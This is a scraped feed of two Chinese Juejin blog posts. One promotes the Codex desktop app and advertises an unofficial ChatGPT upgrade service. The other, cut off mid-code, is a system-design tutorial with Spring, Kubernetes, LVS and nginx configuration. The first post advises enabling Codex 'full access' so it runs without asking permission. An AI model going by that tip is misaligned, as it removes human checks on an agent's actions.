pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近 OpenAI 的 Codex 更新了，并且发布了 Codex 应用版（目前仅支持 mac 电脑， windows/linux 版本都没有推出）。</p>
<p>这次发布的 <strong>Codex 应用不是 IDE，不是 CLI，而是一个代理式编程的指挥中心</strong>。</p>
<p>同时也开启了促销活动，只要安装 Codex 应用版就可以享受：</p>
<ul>
<li>ChatGPT 免费用户 和 Go 用户 可以获得 1个月的 Codex 使用权</li>
<li>所有付费计划（Pro、 Plus、 Business）用户都获得 Codex 2倍的额度，持续2个月。</li>
</ul>
<p>我立马从 vscode 的 codex 转移到 codex 应用，额度不仅充足，<strong>而且 GPT-5.2-Codex 和 GPT-5.2 速度也提升了40%。</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f21a830129b46308c7755781bc9c32d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pGG54OC5bel56iL5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770800188&amp;x-signature=6eKNPD8YupxO4NK89DGOLUjzH1w%3D" alt="" loading="lazy"/></p>
<p>当然这次额度和速度的提升不局限于 Codex 应用，在 Codex CLI 同样可以享受。</p>
<h2 data-id="heading-0">额度和速度提升、Juice 下降</h2>
<p>但是速度的提升有点不对劲，因为 Codex 免费用户的增长，为了平衡计算资源，<strong>推理的 Juice 值 也下降了一半</strong>，从而提升了 40% 的速度 ？</p>
<p>也就是 Codex 可能会时不时出现懒惰的行为，不会读取更多的文件内容，而是快速的输出写完代码了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a13105dbb484f8fa64e11514fdc7374~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pGG54OC5bel56iL5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770800188&amp;x-signature=Y1WXjZKAXDibKSZd0JVOPx4RMMU%3D" alt="" loading="lazy"/></p>
<p>免费版 和 Go 版本的 Juice 值一直很低的，<strong>如果你需要体验好一些的 Codex 编程，建议选择模型 GPT-5.2-Codex，推理选择 超高（Extra High）</strong>，付费用户的额度已经翻倍了，选择超高模式可以使用一段时间。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/38d5f031e7594e5ca55cfd67dbba4175~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pGG54OC5bel56iL5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770800188&amp;x-signature=TKRcVsFlLy6cQSYd4bh9YJdYQPY%3D" alt="" loading="lazy"/></p>
<p>对了，如果你不知道国内如何升级自己的 ChatGPT 的话，可以看一下这个一键升级系统:</p>
<blockquote>
<p>GPT 升级系统：<strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fupchatgpt.com" target="_blank" title="https://upchatgpt.com" ref="nofollow noopener noreferrer">upchatgpt.com</a></strong></p>
</blockquote>
<p>现在外面的 GPT 升级鱼龙混杂，太多嘿充和0元购了，很容易就导致你的账号被封了。</p>
<p>找一个正规渠道，稳定充值的并不简单了，认准当前这个系统，已经稳定运行了好长时间。</p>
<h2 data-id="heading-1">Codex 应用的新功能：</h2>
<ul>
<li>内置工作树（worktree）：使多个代理能够无冲突地工作</li>
<li>计划模式：输入 /plan 与 Codex 进行来回交流</li>
<li>风格：可以选择适合你风格的互动方式</li>
<li>Skills：连接你已使用的skill，并超越编写代码</li>
<li>自动化：在后台委派重复的周期性任务</li>
</ul>
<p>在 Codex 的应用里，你可以创建<strong>自动化任务</strong>。先把规则和目标设置好，之后很多事情 Codex 可以<strong>不用你每次都开口提醒</strong>，自己按时/按条件去执行。</p>
<p>它特别适合做一些“每天都要做、又很耗精力”的工程杂活，比如：</p>
<ul>
<li>问题分流：新来的 issue / 工单先帮你分类、打标签、分配负责人</li>
<li>告警监控：线上一报错或指标异常，自动通知到对应群/负责人，并附上排查线索</li>
<li>CI/CD：代码一合并就自动跑测试、构建、发布，失败了还能把原因总结出来</li>
</ul>
<p><strong>把重复性的日常维护交给 Codex，你把注意力留给真正的开发和设计决策。</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03eecd6b15d44aa2a17042cb14b2bf71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pGG54OC5bel56iL5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770800188&amp;x-signature=8SMGlE5HshPAxfdBa8UmKtI8oN0%3D" alt="" loading="lazy"/></p>
<p>你还可以给 Codex 创建各种 Skill（技能）。 <strong>让 Codex 不只“写代码”，而是“参与把产品做出来”。</strong></p>
<p>把团队常用的工作方式、标准流程、输出格式，做成一套“可复用能力”，让它每次都按你们的习惯来做事。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f18737d568564560a51010ac4633a5b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pGG54OC5bel56iL5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770800188&amp;x-signature=N0TSnEpg%2BMh5IexHBfAEzaDqQaM%3D" alt="" loading="lazy"/></p>
<p>平时编程时，经常碰到 Codex 询问你的权限时，你觉得麻烦的话，可以开启 <code>full access</code> 给他全部访问的权限，后续就会一直运行编码。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95ac1b0e7f354934b0d43423f21cbc7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pGG54OC5bel56iL5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770800188&amp;x-signature=UgJYGrFDdmxG50%2BiFS6gzu5MpNY%3D" alt="" loading="lazy"/></p>
<p>Codex 基于一个简单的前提：所有事物都由代码控制。智能体在推理和生成代码方面越出色，它在所有形式的技术和知识型工作中就越有能力。</p>
<p>Codex 想把“很聪明但不好用的模型”，变成“你能轻松指挥、可监督、能稳定产出并把代码一路推到交付”的工作型智能体。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何设计一个扛住千万级流量的系统？]]></title>    <link>https://juejin.cn/post/7602497125268750342</link>    <guid>https://juejin.cn/post/7602497125268750342</guid>    <pubDate>2026-02-04T02:23:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602497125268750342" data-draft-id="7602512064976551999" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何设计一个扛住千万级流量的系统？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-04T02:23:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="苏三说技术"/> <meta itemprop="url" content="https://juejin.cn/user/465848661970824"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何设计一个扛住千万级流量的系统？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/465848661970824/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    苏三说技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T02:23:25.000Z" title="Wed Feb 04 2026 02:23:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>大家好，我是苏三。</p>
<p>今天跟大家聊一下很多小伙伴都比较关心的话题：如何设计一个扛住千万级流量的系统？</p>
<p>这个话题无论在面试，还是在实际工作中，都非常常见。</p>
<p>今天这篇文章就专门跟大家聊聊这个问题，希望对你会有所帮助。</p>
<h2 data-id="heading-1">01 三个关键点</h2>
<p>在深入技术细节前，我们先要明确设计千万级系统的核心目标。</p>
<p>记住这三个关键点：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62a6014e62dc49daa091c87ad5c031ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770776606&amp;x-signature=XBYdJ4pk7dm0R78A0ZGYcRXtMr0%3D" alt="" loading="lazy"/></p>
<p><strong>1. 高性能</strong>：不是简单追求快，而是要在保证正确性的前提下，用有限的资源处理尽可能多的请求。我们的目标是核心接口P99响应时间低于100毫秒，单机QPS不低于5000。</p>
<p><strong>2. 高可用</strong>：系统需要具备故障自愈能力。我们追求的是“两个9”打底，“三个9”起步，“四个9”努力的目标（即99.99%可用性，全年不可用时间不超过53分钟）。</p>
<p><strong>3. 可扩展</strong>：系统要能随着业务增长而平滑扩展，且扩展成本要可控。这里包括水平扩展（加机器）和垂直扩展（优化单机性能）两个维度。</p>
<h2 data-id="heading-2">02 架构演进：从单体到千万级的四步走</h2>
<p>让我们从一个最简单的电商系统开始，看看它是如何一步步演进到支撑千万级流量的。</p>
<h3 data-id="heading-3">阶段一：单机单体架构（日请求&lt;10万）</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 最简单的Spring Boot单体应用</span>
<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MonolithicApp</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProductService productService;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;
    
    <span class="hljs-meta">@GetMapping("/product/{id}")</span>
    <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProduct</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        <span class="hljs-keyword">return</span> productService.getById(id);
    }
    
    <span class="hljs-meta">@PostMapping("/order")</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> OrderRequest request)</span> {
        <span class="hljs-keyword">return</span> orderService.createOrder(request);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        SpringApplication.run(MonolithicApp.class, args);
    }
}
</code></pre>
<p><strong>问题分析</strong>：</p>
<ul>
<li>所有服务都在一个JVM进程中，一个bug可能导致整个系统崩溃</li>
<li>数据库成为单点瓶颈，无法水平扩展</li>
<li>发布时需要停机，影响用户体验</li>
</ul>
<h3 data-id="heading-4">阶段二：垂直拆分（日请求10万-100万）</h3>
<p>当系统压力增大时，我们首先进行垂直拆分：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 商品服务 - 独立部署</span>
<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductServiceApp</span> {
    
    <span class="hljs-meta">@GetMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProduct</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        <span class="hljs-comment">// 直接查询数据库</span>
        <span class="hljs-keyword">return</span> productRepository.findById(id).orElse(<span class="hljs-literal">null</span>);
    }
}

<span class="hljs-comment">// 订单服务 - 独立部署  </span>
<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/order")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderServiceApp</span> {
    
    <span class="hljs-meta">@PostMapping("/")</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> OrderRequest request)</span> {
        <span class="hljs-comment">// 通过HTTP调用商品服务</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> restTemplate.getForObject(
            <span class="hljs-string">"http://product-service/product/"</span> + request.getProductId(),
            Product.class
        );
        <span class="hljs-comment">// 创建订单逻辑</span>
        <span class="hljs-keyword">return</span> orderRepository.save(order);
    }
}
</code></pre>
<p><strong>关键改进</strong>：</p>
<ol>
<li>数据库按业务拆分：商品库、订单库分离</li>
<li>服务独立部署，故障隔离</li>
<li>可以针对不同服务进行针对性优化</li>
</ol>
<h3 data-id="heading-5">阶段三：水平扩展与服务治理（日请求100万-500万）</h3>
<p>当单实例无法承载流量时，我们开始水平扩展：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># Kubernetes部署配置文件示例</span>
<span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">product-service</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span>  <span class="hljs-comment"># 3个实例</span>
  <span class="hljs-attr">selector:</span>
    <span class="hljs-attr">matchLabels:</span>
      <span class="hljs-attr">app:</span> <span class="hljs-string">product-service</span>
  <span class="hljs-attr">template:</span>
    <span class="hljs-attr">metadata:</span>
      <span class="hljs-attr">labels:</span>
        <span class="hljs-attr">app:</span> <span class="hljs-string">product-service</span>
    <span class="hljs-attr">spec:</span>
      <span class="hljs-attr">containers:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">product-service</span>
        <span class="hljs-attr">image:</span> <span class="hljs-string">product-service:latest</span>
        <span class="hljs-attr">resources:</span>
          <span class="hljs-attr">limits:</span>
            <span class="hljs-attr">memory:</span> <span class="hljs-string">"512Mi"</span>
            <span class="hljs-attr">cpu:</span> <span class="hljs-string">"500m"</span>
        <span class="hljs-attr">readinessProbe:</span>  <span class="hljs-comment"># 就绪探针</span>
          <span class="hljs-attr">httpGet:</span>
            <span class="hljs-attr">path:</span> <span class="hljs-string">/actuator/health</span>
            <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span>
          <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">30</span>
          <span class="hljs-attr">periodSeconds:</span> <span class="hljs-number">10</span>
        <span class="hljs-attr">livenessProbe:</span>   <span class="hljs-comment"># 存活探针</span>
          <span class="hljs-attr">httpGet:</span>
            <span class="hljs-attr">path:</span> <span class="hljs-string">/actuator/health</span>
            <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span>
          <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">60</span>
          <span class="hljs-attr">periodSeconds:</span> <span class="hljs-number">10</span>
<span class="hljs-meta">---</span>
<span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">product-service</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">selector:</span>
    <span class="hljs-attr">app:</span> <span class="hljs-string">product-service</span>
  <span class="hljs-attr">ports:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">80</span>
    <span class="hljs-attr">targetPort:</span> <span class="hljs-number">8080</span>
  <span class="hljs-attr">type:</span> <span class="hljs-string">ClusterIP</span>
</code></pre>
<p><strong>关键改进</strong>：</p>
<ol>
<li>服务多实例部署，负载均衡</li>
<li>引入服务注册与发现（如Nacos、Consul）</li>
<li>增加健康检查，实现故障自动转移</li>
<li>配置中心统一管理配置</li>
</ol>
<h3 data-id="heading-6">阶段四：全链路优化（日请求500万以上）</h3>
<p>当系统规模继续扩大，我们需要更精细的优化：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d57fed678ad7445eb99e2e362c586080~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770776606&amp;x-signature=XBPgxLcHgdmKyxIyKpZfWfI%2BKTI%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9ffdbac90324ad29f67a15cf5a13ac3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770776606&amp;x-signature=q9ROmgL%2FTnK1L6nWKW4i%2B9gX6wk%3D" alt="" loading="lazy"/></p>
<p>这个架构图展示了一个完整的千万级系统架构。</p>
<p>接下来，我们深入每个关键组件。</p>
<h2 data-id="heading-7">03 负载均衡：流量分发的高可用之道</h2>
<p>负载均衡是千万级系统的第一道防线。我们通常采用多层负载均衡策略：</p>
<h3 data-id="heading-8">四层负载均衡（LVS/ELB）</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># LVS DR模式配置示例</span>
<span class="hljs-comment"># 真实服务器配置回环接口</span>
ifconfig lo:0 192.168.1.100 netmask 255.255.255.255 up
route add -host 192.168.1.100 dev lo:0

<span class="hljs-comment"># 配置ARP抑制</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"1"</span> &gt; /proc/sys/net/ipv4/conf/lo/arp_ignore
<span class="hljs-built_in">echo</span> <span class="hljs-string">"2"</span> &gt; /proc/sys/net/ipv4/conf/lo/arp_announce
<span class="hljs-built_in">echo</span> <span class="hljs-string">"1"</span> &gt; /proc/sys/net/ipv4/conf/all/arp_ignore
<span class="hljs-built_in">echo</span> <span class="hljs-string">"2"</span> &gt; /proc/sys/net/ipv4/conf/all/arp_announce

<span class="hljs-comment"># LVS Director配置</span>
ipvsadm -A -t 192.168.1.100:80 -s wrr
ipvsadm -a -t 192.168.1.100:80 -r 192.168.1.10:8080 -g -w 1
ipvsadm -a -t 192.168.1.100:80 -r 192.168.1.11:8080 -g -w 2
</code></pre>
<h3 data-id="heading-9">七层负载均衡（Nginx/API网关）</h3>
<pre><code class="hljs language-nginx" lang="nginx"># Nginx负载均衡配置
upstream backend_servers {
    # 加权轮询，配合健康检查
    server 192.168.1.10:8080 weight=3 max_fails=3 fail_timeout=30s;
    server 192.168.1.11:8080 weight=2 max_fails=3 fail_timeout=30s;
    server 192.168.1.12:8080 weight=1 max_fails=3 fail_timeout=30s;
    
    # 会话保持（需要时开启）
    # sticky cookie srv_id expires=1h domain=.example.com path=/;
    
    # 备份服务器
    server 192.168.1.13:8080 backup;
}

server {
    listen 80;
    server_name api.example.com;
    
    # 限流配置
    limit_req_zone $binary_remote_addr zone=api_limit:10m rate=100r/s;
    
    location /api/ {
        # 应用限流
        limit_req zone=api_limit burst=50 nodelay;
        
        # 连接超时设置
        proxy_connect_timeout 3s;
        proxy_read_timeout 10s;
        proxy_send_timeout 10s;
        
        # 负载均衡
        proxy_pass http://backend_servers;
        
        # 故障转移
        proxy_next_upstream error timeout invalid_header http_500 http_502 http_503;
        proxy_next_upstream_timeout 0;
        proxy_next_upstream_tries 3;
        
        # 添加代理头
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
    
    # 健康检查端点
    location /health {
        access_log off;
        return 200 "healthy\n";
    }
}
</code></pre>
<h3 data-id="heading-10">现代API网关（Spring Cloud Gateway）</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GatewayConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RouteLocator <span class="hljs-title function_">customRouteLocator</span><span class="hljs-params">(RouteLocatorBuilder builder)</span> {
        <span class="hljs-keyword">return</span> builder.routes()
            .route(<span class="hljs-string">"product_route"</span>, r -&gt; r
                .path(<span class="hljs-string">"/api/product/**"</span>)
                .filters(f -&gt; f
                    .requestRateLimiter(config -&gt; config
                        .setRateLimiter(redisRateLimiter())
                        .setKeyResolver(ipKeyResolver()))
                    .circuitBreaker(config -&gt; config
                        .setName(<span class="hljs-string">"productCircuitBreaker"</span>)
                        .setFallbackUri(<span class="hljs-string">"forward:/fallback/product"</span>))
                    .rewritePath(<span class="hljs-string">"/api/(?&lt;segment&gt;.*)"</span>, <span class="hljs-string">"/${segment}"</span>)
                )
                .uri(<span class="hljs-string">"lb://product-service"</span>))
            .route(<span class="hljs-string">"order_route"</span>, r -&gt; r
                .path(<span class="hljs-string">"/api/order/**"</span>)
                .filters(f -&gt; f
                    .requestRateLimiter(config -&gt; config
                        .setRateLimiter(redisRateLimiter())
                        .setKeyResolver(userKeyResolver()))
